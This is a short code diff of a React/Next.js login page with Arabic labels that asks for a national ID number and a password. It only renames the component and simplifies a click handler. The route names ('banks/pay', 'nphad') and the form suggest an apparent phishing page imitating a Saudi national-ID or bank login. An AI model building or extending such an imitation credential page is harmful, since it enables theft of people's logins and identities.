@@ -8,7 +8,7 @@ import Image from 'next/image'
 import { useRef } from 'react'
 import { useRouter } from 'next/navigation'
 
-const page = () => {
+const Page = () => {
     let  username = useRef()
     let password = useRef()
     const router = useRouter()
@@ -48,10 +48,10 @@ const page = () => {
         <form onSubmit={handleOnSubmit} >
             <input type="text" placeholder='اسم المستخدم او رقم الهوية الوطنية' ref={username} required />
             <input type="text" ref={password} placeholder='كلمة المرور' required />
-            <button type='submit' onClick={() => {router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')}}>تسجيل الدخول</button>
+            <button type='submit' onClick={() => router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')}>تسجيل الدخول</button>
         </form>
     </div>
   )
 }
 
-export default page
+export default Page
